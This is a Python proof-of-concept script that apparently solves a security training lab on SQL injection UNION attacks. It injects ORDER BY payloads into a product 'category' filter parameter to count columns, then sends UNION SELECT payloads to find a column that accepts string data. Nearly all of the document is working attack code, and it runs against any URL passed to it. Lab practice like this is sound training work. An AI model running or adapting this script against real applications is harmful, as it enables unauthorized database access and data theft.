# This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.
# The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.
# PoC Script Credit to SamH


import requests
import sys
from urllib.parse import urlparse

def parse_url(raw_url):
    return urlparse(raw_url).scheme + "://" + urlparse(raw_url).netloc

def calculate_columns(url):
    print("[*] Calculating columns...")
    for i in range(1, 30):
        payload = '\' ORDER BY ' + str(i) + '--'
        params = {
            'category': 'Accessories' + payload
        }
        response = requests.get(url, params=params)
        print("Column number : " + str(i) + " , Response status code : " + str(response.status_code))
        if response.status_code == 500:
            print("column number : " + str(i-1))
            return i-1
            exit(1)

def sqli_null_attack(url, col_num):
    null_query = "null," * col_num
    null_query = null_query.rstrip(',')
    payload = f"\' UNION SELECT {null_query}--"
    print(payload)

    params = {
        'category': 'Accessories' + payload
    }
    
    # Exploit
    response = requests.get(url, params=params, allow_redirects=False)
    print("[+] The payload send, please check the response.")
    # print(response.status_code, response.headers)

def find_string_col(url, string, col_num):
    payloads = []
    for i in range(col_num):
        
        payload = ",".join([f"'{string}'" if j == i else "null" for j in range(col_num)])
        payloads.append(payload)  
    
    print("[+] Payload : ")
    for y in payloads:
        print(y)
    
    # Exploit
    print("[+] Sending Payloads...")
    for z in payloads:
        params = {
            'category': 'Accessories' + '\' UNION SELECT ' + z +'--'
        }
        response = requests.get(url, params=params, allow_redirects=False)
        print(f"Try payload {z} : " + str(response.status_code))
    print("[+] Exploit finish.")



if __name__ == "__main__":
    args = sys.argv[1:]

    try:
        retrieve_string = args[1]

        raw_url = args[0]
        base_url = parse_url(raw_url)

        # Exploit
        vuln_url = base_url + '/filter'
        
        # Determining how many database culomns - order by method
        # sqli_null_attack(vuln_url, calculate_columns(vuln_url))
        find_string_col(vuln_url, retrieve_string, calculate_columns(vuln_url))
        



        

    except IndexError:
        print("[!] Error\nUsage: python3 poc.py <lab_url> <retrieve-string>")
